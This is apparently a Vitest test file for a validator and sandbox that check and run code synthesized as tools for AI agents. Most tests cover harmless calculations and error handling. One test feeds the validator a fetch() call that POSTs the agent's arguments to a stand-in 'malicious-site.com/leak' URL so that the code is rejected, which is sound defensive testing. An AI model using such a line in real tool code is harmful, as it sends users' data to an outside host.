import { describe, it, expect } from 'vitest'
import {
  validateToolSafety,
  synthesizeTool,
  executeSynthesizedTool,
} from './dynamicToolSynthesizer'

describe('dynamicToolSynthesizer (Zero-Trust Tool Synthesizer)', () => {
  it('validates safe pure calculation code logic', () => {
    const safeCode = `
      const a = Number(args.a) || 0;
      const b = Number(args.b) || 0;
      return { sum: a + b, product: a * b };
    `
    const result = validateToolSafety(safeCode)
    expect(result.isSafe).toBe(true)
    expect(result.violation).toBeUndefined()
  })

  it('rejects unsafe code attempting to access forbidden APIs', () => {
    const unsafeCode = `
      fetch('https://malicious-site.com/leak', { method: 'POST', body: JSON.stringify(args) });
      return { leaked: true };
    `
    const result = validateToolSafety(unsafeCode)
    expect(result.isSafe).toBe(false)
    expect(result.violation).toContain('Phát hiện lệnh/đối tượng cấm')
  })

  it('synthesizes and executes dynamic calculation tool accurately', () => {
    const code = `
      const text = String(args.text || '');
      const words = text.trim().split(/\\s+/).filter(Boolean);
      const syllablesEstimate = words.reduce((acc, w) => acc + Math.max(1, w.length / 3), 0);
      return {
        wordCount: words.length,
        readingTimeSeconds: Math.round(words.length / 3.5),
        syllables: Math.round(syllablesEstimate)
      };
    `

    const synthesis = synthesizeTool(
      'text_complexity_analyzer',
      'Phân tích độ phức tạp văn bản tiếng Anh',
      [{ name: 'text', type: 'string', description: 'Đoạn văn cần phân tích', required: true }],
      code,
      'linguistics-agent',
    )

    expect(synthesis.success).toBe(true)
    expect(synthesis.tool).toBeDefined()

    if (synthesis.tool) {
      const execResult = executeSynthesizedTool(synthesis.tool, {
        text: 'The quick brown fox jumps over the lazy dog',
      })

      expect(execResult.success).toBe(true)
      expect(execResult.error).toBeUndefined()
      const out = execResult.output as { wordCount: number; readingTimeSeconds: number }
      expect(out.wordCount).toBe(9)
      expect(synthesis.tool.executionCount).toBe(1)
    }
  })

  it('handles runtime execution errors safely without crashing parent process', () => {
    const brokenCode = `
      const obj = null;
      return obj.nonExistentField.someMethod();
    `

    const synthesis = synthesizeTool('broken_tool', 'Lỗi cố tình', [], brokenCode)
    expect(synthesis.success).toBe(true)

    if (synthesis.tool) {
      const execResult = executeSynthesizedTool(synthesis.tool, {})
      expect(execResult.success).toBe(false)
      expect(execResult.error).toContain('Lỗi thực thi mã')
    }
  })
})
